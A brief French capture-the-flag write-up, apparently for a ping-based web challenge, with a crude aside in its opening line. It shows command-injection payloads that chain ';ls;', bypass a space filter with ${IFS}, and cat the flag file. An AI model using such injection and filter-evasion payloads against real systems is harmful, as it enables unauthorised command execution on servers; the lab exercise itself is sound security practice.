# Writeup
Pas trop détaillé psq nik la poliss

## Recon
Pareil que le précédent :
```bash
ping -c 1 $ip
```

On teste la payload `;ls;` ça passe ! Easy man !
En fait non, les espaces sont filtrés __cheh__.

## Exploit
On bypass le filtrage de l'espace :
```bash
;ls${IFS}-al;
```

On a alors le chemin vers le flag : `flag/it/is/soon/here/flag.md`

## Résumé
```bash
;cat${IFS}flag/it/is/soon/here/flag.md;
```
